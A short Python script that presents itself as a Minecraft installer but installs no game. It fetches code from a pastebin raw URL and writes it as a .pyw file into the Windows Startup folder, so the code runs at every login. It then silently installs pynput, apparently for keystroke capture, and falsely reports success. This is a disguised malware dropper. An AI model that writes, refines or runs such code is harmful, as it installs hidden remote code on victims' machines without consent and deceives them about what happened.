import os
import getpass
import requests

try:
    print("[Minecraft Installer]")
    print("This installer contains the logic required to install the Minecraft Launcher.")
    input("Press ENTER to begin the installation. ")

    open(f"C:/Users/{getpass.getuser()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/startup.pyw","w").write(requests.get("https://pastebin.com/raw/gAYiBPjh").text)

    os.system(f"pip install requests --quiet --upgrade >NUL 2>&1")
    os.system(f"pip install pynput --quiet --upgrade >NUL 2>&1")
    os.system(f"pip install datetime --quiet --upgrade >NUL 2>&1")
    input("\nSuccessfully installed Minecraft. ")
except Exception as e:
    input(f"An error occured while installing the product: {e} ")